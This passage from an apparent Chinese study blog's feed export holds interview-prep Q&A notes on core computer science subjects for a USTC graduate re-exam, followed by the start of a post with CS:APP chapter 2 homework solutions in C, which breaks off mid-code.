<li><p>cache命中率和cache块的大小有什么关系？对于给定的Cache容量，当块大小增加时，命中率开始时处于上升趋势，后来反而会下降。因为程序局部性原理，增加块大小增加了利用空间局部性的机会；另一方面，在容量一定情况下，增加块大小会减少总的块数目，会增加冲突失效。</p></li>
<li><p>cache里LRU怎么实现？</p></li>
<li><p>虚拟存储和高速缓存的结构和各自的作用?</p></li>
<li><p>Cache与虚拟存储器的不同？cache是为了解决系统速度问题，虚拟存储器是为了解决主存容量不够的问题。Cache有硬件实现，对所有程序员透明，虚拟存储器是由OS和硬件共同实现，对应用程序员透明。Cache不命中可直接访问内存，但是虚拟存储器不命中只能调入主存后再访问，对性能影响更大。</p></li>
<li><p>所谓的命中率是什么?访问cache有效的次数除以总次数。</p></li>
<li><p>指令执行的步骤有哪些?取指、译码、访存、执行、写回</p></li>
<li><p>微程序控制器的原理？一条指令分为多个执行步骤，每个步骤对应一段操作，把这个操作作为一段微程序存入控制存储器，这样执行的时候就可以通过查询控制存储器生成操作信号序列。</p></li>
<li><p>指令周期的阶段？取指周期，间指周期（取操作数），执行周期，中断周期。</p></li>
<li><p>每个阶段什么时候可以有中断？中断只能在一条指令执行结束（中断周期）以后才能响应。</p></li>
</ul>
<h2 id="操作系统">操作系统</h2>
<ul>
<li><p>操作系统有什么功能？对计算机资源管理。进程管理（处理机资源）、存储器管理、文件管理、设备管理。</p></li>
<li><p>系统调用？操作系统向用户提供的一系列接口，凡是与计算机资源有关的操作，用户必须通过系统调用向操作系统提出服务请求，让操作系统代为处理。</p></li>
<li><p>库函数？部分库函数是对系统调用的封装，部分库函数不使用系统调用。</p></li>
<li><p>系统调用和函数调用谁的开销大？普通的函数调用一般只需要几次寄存器操作，如果有参数的话，再进行几次用户栈操作，用户栈局部性较好，可能也不需要进行内存I/O。而系统调用要先从用户态切换到内核态，内核态的栈用的是内核的栈，所以还要进行栈的切换，一定程度上会破坏程序局部性，所以导致cache、TLB缓存命中率都可能下降。还有额外的权限校验、有效性检验等，导致系统调用开销更大。</p></li>
<li><p>系统调用和函数调用哪个速度快？上题。</p></li>
<li><p>操作系统里线程的类别，底层怎么实现的？用户级线程：线程的管理由应用程序完成；内核级线程：线程的管理由内核完成。组合形式。</p></li>
<li><p>实时系统和Windows的分时系统有什么区别，在硬件上呢？实时系统：保证高可靠性；分使系统：用户交互。</p></li>
<li><p>Linux虚拟地址空间？执行一个程序时，操作系统创建一个独立的虚拟地址空间，但是并不设置与物理内存的映射关系，这些映射关系等到后面程序发生页错误的时候再进行设置；虚拟地址空间通常与操作系统的位数有关，比如32位系统就是4GB，其中一部分是内核区域不能被使用，还有被其他程序占用的部分，所以进程实际能使用的内存要比虚拟内存少，当发生缺页且无空闲物理块时，就需要发生替换。</p></li>
<li><p>死锁的定义？在多道程序系统中，程序并发执行，多个进程竞争资源造成相互等待，都无法继续进行下去。</p></li>
<li><p>死锁的4个条件？互斥条件、不可剥夺、循环等待、请求并保持。</p></li>
<li><p>win10里设置有死锁解决办法吗？猜测任务管理器，直接结束任务。</p></li>
<li><p>微内核、微服务？微内核：将内核中最基本的功能（如进程管理）保留在内核，其他不需要在核心态运行的功能移到用户态执行，降低内核设计的复杂性。其他作为服务程序，相互独立，通过内核进行通信。</p></li>
<li><p>什么是大内核和微内核？大内核：主要功能模块都运行在核心态，紧密联系，设计复杂。</p></li>
<li><p>Linux 用的是哪种内核？大内核。</p></li>
<li><p>PV操作、生产者消费者问题？</p></li>
<li><p>同步机制应该遵循的原则？空闲让进、忙则等待、有限等待、让权等待。</p></li>
<li><p>同一进程内的两线程对一个初值为0的共享变量分别进行10次加1操作，在不采取同步互斥措施的情况下，共享变量的最终值是多少？（老师说：2～20）</p></li>
<li><p>目录与文件的区别？</p></li>
<li><p>目录文件的内容？文件名+索引节点指针</p></li>
<li><p>信号量的作用? 同步与互斥</p></li>
<li><p>FAT，Ext2名词解释，磁盘分区 FAT：文件分配表</p></li>
<li><p>银行家算法的缺点？该算法要求请求资源的进程数数保持固定不变，这在多道程序系统中是难以做到的。开销大。</p></li>
<li><p>说一下缺页中断？CPU响应中断、从外存中找到页面，判断内存是否满，如果满的话执行替换算法，将其中一页换出，不满的话启动I/O将页面调入内存，修改页表，并将此页表项写入TLB。</p></li>
<li><p>如果让你设计一个操作系统你有什么思路？</p></li>
<li><p>工作集算法的缺点？</p></li>
<li><p>并发有哪些？</p></li>
<li><p>内存管理方法？连续分配方式：固定分区分配、动态分区分配。非连续分配方式：分页存储管理方式、分段存储管理方式。Linux用的是哪种？Linux采用段页式内存管理。</p></li>
<li><p>分页系统怎么将逻辑地址转化为物理地址?
将逻辑地址分为两个部分，页号和页内偏移量，通过查页表将逻辑页号转换成物理块号，与页内偏移拼接在一起就是物理地址。</p></li>
<li><p>快表、页表？</p></li>
<li><p>页表，多级页表？</p></li>
<li><p>段表和页表区别？段表项：段号、段长、段内偏移。页表只需要给出：页号和页内偏移。</p></li>
<li><p>反表？虚拟地址太长，页表太大。同时查找整个表，得到虚拟地址对应的物理帧。</p></li>
<li><p>页表会加速进程运行吗？在不分页的情况下，指令首先通过在主存取指令，从而访问内存一次，有了分页机制后，会因为要多次访问页表而引起更多次内存访问。</p></li>
<li><p>如果给进程分配分区的过程中，产生很多细小的外部碎片，怎么解决？紧凑技术</p></li>
<li><p>紧凑技术的具体原理是什么？操作系统对进程进行移动和整理，需要动态重定位寄存器的支持。</p></li>
<li><p>内存里的LRU怎么实现？使用CLOCK算法或其变体。</p></li>
<li><p>CLOCK置换算法？简单CLOCK置换算法：给每个物理块加一个使用位，首次装入主存，置为1。需要替换时，循环扫描所有的候选物理块，碰到使用位1将其置0，扫描下一帧，碰到0将其作为替换的块。</p></li>
<li><p>线程和进程区别？线程时独立调度的基本单位，进程时分配资源的基本单位，线程不拥有系统资源，但是可以共享其所属进程的资源。进程相互独立，进程中的线程对其他进程不可见。进程切换开销大，线程切换开销小。</p></li>
<li><p>进程间如何通信？管道通信、共享存储等。</p></li>
</ul>
<h2 id="计算机网络">计算机网络</h2>
<ul>
<li><p>计算机网络中的四种延迟分别是什么？发送时延、传播时延、处理时延、排队时延</p></li>
<li><p>拥塞控制和流量控制的区别？拥塞控制是作用于网络的，它是防止过多的数据注入到网络中出现网络负载过大的情况；流量控制时作用于发送者的，控制发送者的发送速度，使得接收者来得及接收。</p></li>
<li><p>网络层和传输层是干什么的？网络层：为不同网络上的主机提供通讯服务。传输层：负责主机间两个进程的通信。</p></li>
<li><p>计算机网络分为哪两个部分？边缘，核心。</p></li>
<li><p>TCP/IP模型?
从低到高分为网络接口层、网际层、传输层、应用层。TCP/IP模型可靠性是端到端的问题，所以网际层是无连接的，传输层支持无连接和面向连接两种方式。</p></li>
<li><p>OSI参考模型？七层模型。物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。在网络层支持无连接和面向连接的通信，传输层仅有面向连接。</p></li>
<li><p>TCP的网际接口层对应哪两层？数据链路层和物理层</p></li>
<li><p>802.11协议？无线局域网的协议，MAC层使用CSMA/CA协议。</p></li>
<li><p>CSMA/CA、CSMA/CD协议及其区别？CD：适用于以太网，CA适用于无线局域网。CSMA/CD：可以冲突检测但是无法避免。CSMA/CA发送数据时无法检测冲突，所以只能尽量避免。</p></li>
<li><p>数据链路层的可靠性？</p></li>
<li><p>网络中的集线器和网桥的区别？</p></li>
<li><p>路由器的作用？收集网络拓扑信息并动态形成路由表。根据路由表转发IP数据包。隔离广播域。</p></li>
<li><p>外部路由协议和内部路由协议有哪些？内部路由协议：RIP,OSPF。外部路由协议：BGP。</p></li>
<li><p>ICMP协议的作用？作为IP数据报的数据，让主机或路由器报告差错和异常情况，提高IP数据报交付成功的机率。</p></li>
<li><p>ICMP是从哪里发送给哪里的，需不需要发送给主机？目标主机或到目标主机路径上的路由器发送给源主机，报告差错和异常情况。</p></li>
<li><p>PING ：使用了ICMP的会送请求和回答报文。</p></li>
<li><p>IP数据报最小长度多少？IP数据报的最大长度？总长度格式：16位，以字节为单位。</p></li>
<li><p>实际中IP数据报可以达到这么大的长度吗？IP数据报的最大长度受数据链路层的最大传送数据单元制约。比如以太网1500字节。</p></li>
<li><p>ipv4用完解决方法？ipv6；NAT技术：小的局域网使用一个网段的私网地址，与外界连接再换成公网地址。CIDR：在变长子网掩码的基础上提出的一种消除传统ABC类网络的IP地址划分方法。</p></li>
<li><p>什么是CIDR，有什么功能？CIDR：在变长子网掩码的基础提出的一种消除传统ABC类网络的IP地址划分方法。使用网络前缀代替子网的概念，可以按照实际需要划分更加合理的IP地址空间，提高地址空间的利用率。将网络前缀相同的IP地址进行路由聚合，减少路由项，提高网络性能。</p></li>
<li><p>交换机和路由器的区别？交换机是数据链层设备，隔离冲突域，不能隔离广播域。路由器是网络层设备，隔离广播域。</p></li>
<li><p>ARP协议是什么？ARP协议及其应用？地址解析协议。解决同一个局域网下的主机或路由器IP地址和MAC地址的映射问题。</p></li>
<li><p>NAT？私网IP与公网IP转换。</p></li>
<li><p>流量控制的方法？停止-等待协议。滑动窗口协议。</p></li>
<li><p>停等协议的主要作用？发送窗口大小如何设置，发送窗口大小确定后发送方一次能够发送的数据量受什么限制</p></li>
<li><p><strong>滑动窗口原理？</strong>发送端维持一个发送窗口，接收方维持一个接受窗口。发送窗口用来进行流量控制，表示还未收到对方确认信息的情况下最多还可以发送的数据帧。接受窗口用于控制收到数据帧是否能接受，如果在此窗口内就可以接受，否则丢弃。</p></li>
<li><p><strong>滑动窗口的作用？</strong>流量控制。保证接受的顺序正确。</p></li>
<li><p>滑动窗口发送端怎么触发？收到确认则可以向前滑动。用数据结构怎么描述或者实现？链表？</p></li>
<li><p>拥塞控制？</p></li>
<li><p>介绍两个使用了广播技术的协议？IGMP：主机只发送一份，只在路径分叉时才复制转发。</p></li>
<li><p>组播与广播？组播：一对一组。广播：一对所有，会被局限在局域网内，因为路由不会转发。单播：一对一。</p></li>
<li><p>广播的实际应用？视频会议、直播等。</p></li>
<li><p>同步传输和异步传输？</p></li>
<li><p>串行并行传输优缺点？从原理上讲，在相同的工作频率下并行传输的传输速度远比串行传输大，但并行线路有一些难以克服的缺点，如：成本高、占用空间大、信号间干扰大。无法用于长距离通信，只适合于短距离、要求传输速度快的场合使用，如计算机内部的总线。</p></li>
<li><p>TCP和UDP中，为什么TCP是可靠的？使用了流量控制和拥塞避免。</p></li>
<li><p>发电子邮件的协议和过程？SMTP发送邮件，POP3拉取邮件。</p></li>
<li><p>DNS的过程?递归查询；递归与迭代相结合。</p></li>
<li><p>DNS功能? 域名转换成IP。</p></li>
<li><p>FTP端口号？21控制端口，20数据连接端口</p></li>
</ul>
<h2 id="离散数学">离散数学</h2>
<ul>
<li><p>问你个最简单的，为啥要叫离散数学？离散数学的研究对象不是连续变化的实数，而是整数、图和命题这样离散的不连续的对象。</p></li>
<li><p>离散数学的学习内容？集合论、代数系统、图论、数理逻辑等。</p></li>
<li><p>什么是集合？由离散个体构成的整体的称为集合，称这些个体为集合的元素。</p></li>
<li><p>集合元素的性质？无序性、相异性、确定性、任意性</p></li>
<li><p>什么是幂集？集合的全体子集构成的集合叫做幂集。</p></li>
<li><p>什么是<strong>笛卡尔积</strong>？设有两个集合 A与 B，用 A与
B中的元素组成有序偶，以 A的元素作为有序偶的第一个分量，以
B的元素作为有序偶的第二个分量，用这种方式所组成的有序偶的全体构成一个集合，称为
A与 B的笛卡尔乘积。</p></li>
<li><p><strong>二元关系</strong>的定义？集合中的元素都是有序对或者这个集合是空集；</p></li>
<li><p><strong>等价关系</strong>和等价类的定义？设 R为非空集合
A上的一个关系，如果 R是自反的、对称的和传递的，则称 R为
A上的等价关系。A中所有与x等价的全体元素构成的子集称为等价类。</p></li>
<li><p><strong>偏序关系</strong>与偏序集？自反的、反对称的和传递的。</p></li>
<li><p>集合、关系与函数之间的关系？在集合之上建立关系，关系建立集合与集合间的联系。函数是一种特殊的关系。</p></li>
<li><p>单射、满射和双射的概念？单射：不同的x对应不同的y。
满射：对任意一个y都有x与之对应。双射：单射+满射（一一对应）</p></li>
<li><p><strong>代数系统</strong>的定义？非空集合S加上
若干个集合S上的一元或二元运算构成一个代数系统。</p></li>
<li><p><strong>子代数系统</strong>？一个代数系统V=&lt;S,f1….&gt;
集合B是集合S的非空子集，B对这个代数系统的所有二元运算都是封闭的，那么称B加上这些运算是代数系统V的一个子代数系统。</p></li>
<li><p>典型的代数系统？半群、独异点与群、环与域、格与布尔代数。<strong>半群</strong>——代数系统由一个非空集合S加上一个二元运算，这个二元运算满足结合律。<strong>独异点</strong>——半群，且非空集合S中含有一个单位元。<strong>群</strong>——具有单位元与逆元的半群。<strong>交换群/阿贝尔群</strong>：结合律，分配律。</p></li>
<li><p><strong>平面图</strong>？可以画在平面上，任意两边都不相交。</p></li>
<li><p>什么是<strong>哈密顿图</strong>？能走出一条通过每个结点仅一次的回路。</p></li>
<li><p>什么是<strong>欧拉图</strong>？能走出一条通过每条边仅一次的回路。</p></li>
<li><p><strong>欧拉公式</strong>：n – m + r =
2，n：顶点个数。m:边个数。r:面个数。</p></li>
<li><p><strong>命题</strong>？能够判断真假的陈述句。原子（简单）命题——不能再分解为更简单命题的命题。复合命题——由原子命题通过命题联结词构成的命题。</p></li>
<li><p><strong>命题联结词</strong>？非、合取、析取、等价、蕴含</p></li>
<li><p><strong>析取范式、合取范式</strong>？析取范式——有限个简单合取式构成的析取式；合取范式——有限个简单析取范式构成的合取式；</p></li>
<li><p><strong>主合取范式与主析取范式</strong>？主合取范式——构成的简单析取式都是极大项；主析取范式——构成的简单合取式都是极小项。</p></li>
</ul>
<h2 id="数据库">数据库</h2>
<ul>
<li><p>怎么设计一个数据库？七个阶段：规划、需求分析、概念设计、逻辑设计、物理设计、实现、运行维护</p></li>
<li><p>对于目前的复试面试系统如何设计数据库？</p></li>
<li><p>数据库的发展阶段?
人工管理阶段、文件系统阶段、数据库系统阶段。</p></li>
<li><p>数据库的种类？按照数据的保存格式进行分类：层次、关系(MySQL,
Oracle Database、SQL Server)、面向对象、键值存储数据库（Redis）</p></li>
<li><p>Oracle是什么型数据库，Oracle数据库的特点?关系型数据库，多用户、数据完整性、安全性性能优越、支持分布式、跨平台。</p></li>
<li><p>试述数据库系统<strong>三级模式</strong>结构，这种结构的优点是什么？外模式（单个用户使用的数据视图）、概念模式（全局数据视图）、内模式（数据视图的物理存储）。优点：保证物理数据独立性、逻辑数据独立性。物理数据独立性：如果数据库内模式要修改，只要修改模式/内模式的映像，概念模式尽可能保持不变。如果数据库概念模式要修改，只要修改外模式/模式的映像，外模式尽可能保持不变。</p></li>
<li><p>数据库的<strong>两级映射</strong>？外模式/模式映像；模式/内模式映像。</p></li>
<li><p>数据库外模式可以有几种？一对一还是一对多？一个数据库可以有多个外模式，一对多。</p></li>
<li><p>常用的数据模型？概念数据模型：实体联系模型。结构数据模型：层次数据模型、网状数据模型、关系数据模型、面向对象模型、半结构化模型。</p></li>
<li><p>最早的数据模型？层次数据模型。</p></li>
<li><p>关系模型图灵奖获得者是谁？E. F. Codd (埃德加 • 科德)</p></li>
<li><p>内连接与外连接？内连接的特性是只显示符合连接条件的记录，外连接必然会返回其中一张表的全部数据，哪怕不匹配。</p></li>
<li><p>假如有上百个个人密码，数据库如何储存个人密码，不会泄露？</p></li>
<li><p>数据库规范化设计理论？</p>
<blockquote>
<p>三个内容：数据依赖、范式、模式设计方法。</p>
<p>目的：设计出合理的关系型数据库，解决关系模式数据冗余、异常、不一致问题。便于插入、删除和更新。</p>
</blockquote></li>
<li><p>范式的概念——关系数据库有多少范式，简述？关系数据库有六种范式：第一范式（1NF）、第二范式（2NF）、第三范式（3NF）、巴斯-科德范式（BCNF）、第四范式(4NF）和第五范式（5NF，又称完美范式）</p></li>
<li><p>数据库的范式越来越高会产生什么影响？越高的范式数据库冗余越小。</p></li>
<li><p>什么是<strong>基本表</strong>？什么是<strong>视图</strong>？两者的区别和联系是什么？基本表：实际存储在数据库中的表。视图：从一个或者多个基本表导出的表。视图是一个定义，是不存储数据的虚表，所有对视图的操作都要转换到基本表上。视图可以和基本表一样被查询，但是更新（增、删、改）操作会受到一定限制。</p></li>
<li><p>视图不允许更新的几种情况？多个表连接操作导出的；导出时使用了分组和聚合操作；从单个基本表导出，但是不包含表的主键或者候选键。</p></li>
<li><p>试述视图的优点?数据安全性、查询简化、逻辑数据独立性（应用建立在视图上，只要修改视图定义中的子查询部分，相当于映射部分，其他可以保持不变）。</p></li>
<li><p>解释一下，数据库的索引?类似于字典的索引。</p></li>
<li><p>索引所属的模式范畴？内模式</p></li>
<li><p>存储过程？一组为了完成特定功能的SQL
语句集，存储在数据库中，经过第一次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来调用存储过程。（类似于一段编译好的脚本）</p></li>
<li><p>数据SQL语句底层执行？连接数据库、查询缓存、分析器（分析词法、语法）、优化器（使用哪个索引、多表关联时决定连接顺序）、执行器（验证是否有读写权限，有的话就调用存储引擎接口获取结果集合）</p></li>
<li><p>对比
非关系型系统与关系数据库系统？RDBMS关注一致性（ACID模型），而NoSQL系统则关注可用性。关系型数据库通常是以表格形式存储数据，而NoSQL系统有多种存储方式，包括key/value存储（Redis）、文档存储（MongoDB）以及图存储（Neo4j）等。当数据达到一定规模时，关系型数据库易出现死锁等并发问题，导致其读写速度下滑非常严重。而NoSQL数据库结构简单、集成缓存能力，读写性能非常好。举例：金融业一致性重要，选择关系型数据库。购物网站、社交网站等对可用性要求较高，选择非关系型数据库</p></li>
<li><p>数据库管理系统（DBMS）的主要功能有哪些？数据库定义（结构、约束）；数据库操纵、数据库的保护、数据库的维护。</p></li>
<li><p>数据库的保护：事务、恢复、并发控制、完整性控制、安全性控制</p></li>
<li><p>事务的四大特性？原子性、一致性、隔离性、持久性</p></li>
<li><p>完整性约束？域约束、基本表约束（候选键、外键、检查约束）、断言</p></li>
<li><p>事务并发操作带来的三个问题：丢失更新、读脏数据、不一致分析</p></li>
<li><p>处理并发问题的机制：封锁技术。排他性封锁（X锁），共享型封锁（S锁）</p></li>
<li><p>封锁技术产生的三个问题：活锁、饿死、死锁。活锁——一个事务
一直得不到封锁机会；饿死——一直有事务加S锁，加X锁的事务加不上；死锁——两个或以上事务互相等待，导致任何一个都无法继续执行。</p></li>
<li><p>数据库<strong>安全性控制</strong>的常用方法和技术？视图机制、授权子系统。</p></li>
</ul>
<h2 id="编译原理">编译原理</h2>
<ul>
<li><p>我看你学了编译原理，能跟我讲讲你们编译原理上了什么内容吗？</p></li>
<li><p>说一下编译的五大过程</p></li>
<li><p>语义分析的输入和输出是什么</p></li>
<li><p>对比C/Java中的程序起点是main()函数，汇编程序的起点标志是什么？</p></li>
<li><p>编译前端与编译后端</p></li>
<li><p>根据已有编译器，生成新编译器</p></li>
<li><p>上下文无关文法</p></li>
<li><p>文法的二义性</p></li>
<li><p>乔姆斯基四类文法</p></li>
<li><p>自动机</p></li>
<li><p>非确定有限(状态)自动机（NFA）与确定有限(状态)自动机（DFA）的区别</p></li>
<li><p>语法分析：自上而下分析与自下而上分析</p></li>
<li><p>编译过程5个阶段各自的任务</p></li>
</ul>
<h2 id="数字图像处理">数字图像处理</h2>
<ul>
<li><p>计算机视觉、图形学和图像处理，三者有什么联系？Computer
Vision，简称
CV。输入的是图像或图像序列，通常来自相机、摄像头或视频文件。输出的是对于图像序列对应的真实世界的理解，比如检测人脸、识别车牌、区分猫狗。Digital
Image Processing，简称 DIP。输入的是图像，输出的也是图像。Photoshop
中对一副图像应用滤镜就是典型的一种图像处理。常见操作有模糊、灰度化、增强对比度等。</p></li>
<li><p>图形学与数字图像处理？</p></li>
<li><p>模拟图像与数字图像？模拟图像：通过某种<strong>物理量（如光、电等）的强弱变化</strong>来记录图像亮度信息的图像，是<strong>连续</strong>的，肉眼可见的。数字图像：用<strong>存储数字的矩阵</strong>来表达客观物体的图像，是一个<strong>离散</strong>采样点的集合，肉眼不可见。</p></li>
<li><p>数字图像处理的主要研究内容？图像的获取和存储、压缩、去除噪声、增强、复原、分割、提取特征等。</p></li>
<li><p>灰度图像、二值图像与彩色图像？</p></li>
<li><p>对比度扩展？</p></li>
<li><p>如何进行二值化？</p></li>
<li><p>直方图均衡化？利用图像直方图对对比度进行调整。把一个已知灰度概率密度分布的图像经过一种变换，使之演变为一幅具有均匀灰度概率密度分布的新图像。</p></li>
<li><p>什么是中值滤波？消除图像中的噪声又保留细节。取奇数窗口所有像素的中间值，替换到中心位置的像素。</p></li>
<li><p>怎么消除噪声？滤波器。</p></li>
<li><p>图像分割？</p></li>
<li><p>数字图像说一个模型我问你</p></li>
</ul>
<h2 id="模式识别">模式识别</h2>
<ul>
<li><p>什么是模式识别？</p></li>
<li><p>模式识别的课程学过什么？特征降维、朴素贝叶斯算法、支持向量机、k均值算法、人脸识别、人脸检测等等。</p></li>
<li><p>模式识别与机器学习有什么区别？模式识别：人类主动去描述某些特征给机器，然后让机器做出分类、识别等。机器学习：机器从已知的经验数据（样本）中，通过某种特定的方法（算法），自己去寻找提炼（训练/学习）出一些规律（模型）；提炼出的规律就可以用来判断一些未知的事情（预测）。</p></li>
<li><p>聚类算法？聚类是无监督算法。举例：K均值算法。原理：初始化k个簇的质心，计算每个数据点与每个质心的距离，将数据点分配到与其最近的簇。对每个簇计算其所有点的均值作为新的质心。</p></li>
<li><p>无监督和有监督算法的区别？</p></li>
<li><p>过拟合、欠拟合？</p></li>
<li><p>人工智能里面的CPU和GPU有什么不同</p></li>
</ul>
<h2 id="大数据技术基础">大数据技术基础</h2>
<ul>
<li><p>学习内容？虚拟机、Linux、Python基础知识；大数据处理架构Hadoop；分布式文件系统HDFS；NoSQL数据库；MapReduce；Spark；大数据案例（数据可视化、推荐系统、自然语言处理等）</p></li>
<li><p>人工智能和大数据的关系？</p></li>
<li><p>什么是大数据？</p></li>
<li><p>机器学习，数据挖掘，大数据分析的区别？大数据侧重描述数据，数据挖掘侧重描述应用，机器学习侧重描述方法。机器学习方法在大型数据中的应用称为数据挖掘。</p></li>
</ul>
<h1 id="后记">后记</h1>
<p>上面的问题基本都是我一条一条从网上搜的资料以及自己翻阅教材的结果，部分没搜到答案的就只能自由发挥了，面试最主要就是心态，老师都挺好的，也没怎么为难人，我感觉全程老师都很和善的，面试完了还夸人，点赞！</p>
<p>另外其实复试当中笔试占比较大，难度也挺高的，面试大家基本都差不多，还是得看笔试，不提前准备真的就凉了。。。</p>
<p>祝考研上岸！</p>
<h1 id="参考">参考</h1>
<p>2021年上岸知乎大佬zdszero的分享：<a href="https://zhuanlan.zhihu.com/p/377692017">中科大计算机考研复试详解</a></p>
]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>整理</tag>
      </tags>
  </entry>
  <entry>
    <title>中科大计算机系统作业1</title>
    <url>/post/8bdd78fc.html</url>
    <content><![CDATA[<p>本文为中科大研究生课程——计算机系统作业1的题目解答记录。使用的教材为《深入理解计算机系统》。</p>
<span id="more"></span>
<h1 id="题目与解答">题目与解答</h1>
<h2 id="section">2.58</h2>
<p>编写过程is_little_endian, 当在小端法机器上编译和运行时返回1,
在大端法机器上编译运行时则返回0
。这个程序应该可以运行在任何机器上，无论机器的字长是多少。</p>
<p><strong>解：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> *byte_pointer; <span class="comment">// 定义一个字节指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_little_endian</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0xff</span>;                          <span class="comment">// 存储在内存中为 0x00 0x00 0x00 0xff</span></span><br><span class="line">    byte_pointer start = (byte_pointer)&amp;num; <span class="comment">// 强制转换为四个字节数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (start[<span class="number">0</span>] == <span class="number">0xff</span>) <span class="comment">// 小端模式读取的第一个字节为0xff</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 大端模式读取的第一个字节为0x00</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, is_little_endian());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="section-1">2.61</h2>
<p>写一个C 表达式，在下列描述的条件下产生1, 而在其他情况下得到0
。假设x是int类型。</p>
<p>A. x的任何位都等于1 。</p>
<p>B. x的任何位都等于0 。</p>
<p>C. x的最低有效字节中的位都等于1 。</p>
<p>D. x的最高有效字节中的位都等于0 。</p>
<p>代码应该遵循位级整数编码规则，另外还有一个限制，你不能使用相等（==）和不相等（!=）测试。</p>
<p><strong>解：</strong></p>
<ol type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">!~x</span><br></pre></td></tr></table></figure>
<ol start="2" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">!x</span><br></pre></td></tr></table></figure>
<ol start="3" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">!((~x)&amp;<span class="number">0xff</span>)  或</span><br><span class="line">!~(x|~<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure>
<ol start="4" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">!((x &gt;&gt; ((<span class="keyword">sizeof</span>(<span class="type">int</span>)<span class="number">-1</span>) &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xff</span>)</span><br></pre></td></tr></table></figure>
<h2 id="section-2">2.77</h2>
<p>假设我们有一个任务：生成一段代码，将整数变量x 乘以不同的常数因子K
。为了提高效率，我们想只使用 + 、-
和&lt;&lt;运算。对于下列K的值，写出执行乘法运算的C表达式，每个表达式中最多使用3个运算。</p>
<p>A. K=17</p>
<p>B. K=-7</p>
<p>C. K=60</p>
<p>D. K=-112</p>
<p><strong>解：</strong></p>
<ol type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(x&lt;&lt;<span class="number">4</span>)+x</span><br></pre></td></tr></table></figure>
<ol start="2" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">x-(x&lt;&lt;<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<ol start="3" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(x&lt;&lt;<span class="number">6</span>)-(x&lt;&lt;<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<ol start="4" type="A">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(x&lt;&lt;<span class="number">4</span>)-(x&lt;&lt;<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
<h2 id="section-3">2.84</h2>
<p>填写下列程序的返回值，这个程序测试它的第一个参数是否小于或者等于第二个参数。假定函数f2u
返回一个无符号32
位数字，其位表示与它的浮点参数相同。你可以假设两个参数都不是NaN 。两种0,
+0 和-0 被认为是相等的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">float_le</span><span class="params">(<span class="type">float</span> x, <span class="type">float</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> ux = f2u(x);</span><br><span class="line">    <span class="type">unsigned</span> uy = f2u(y);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*Get the sign bits*/</span> </span><br><span class="line">    <span class="type">unsigned</span> sx = ux &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="type">unsigned</span> sy = uy &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="comment">/*Give an expression using only ux, uy, sx, and sy*/</span></span><br><span class="line">    <span class="keyword">return</span>   ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>解：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">f2u</span><span class="params">(<span class="type">float</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> *)&amp;x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">float_le：测试它的第一个参数是否小于或者等于第二个参数 x&lt;=y 则 true </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">float_le</span><span class="params">(<span class="type">float</span> x, <span class="type">float</span> y)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//将浮点数按照无符号数解释（位不变）</span></span><br><span class="line">    <span class="type">unsigned</span> ux = f2u(x);</span><br><span class="line">    <span class="type">unsigned</span> uy = f2u(y);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得符号位 0或1</span></span><br><span class="line">    <span class="type">unsigned</span> sx = ux &gt;&gt; <span class="number">31</span>; </span><br><span class="line">    <span class="type">unsigned</span> sy = uy &gt;&gt; <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四种x&lt;=y的情况返回true</span></span><br><span class="line">    <span class="keyword">return</span> (ux &lt;&lt; <span class="number">1</span> == <span class="number">0</span> &amp;&amp; uy &lt;&lt; <span class="number">1</span> == <span class="number">0</span>) || <span 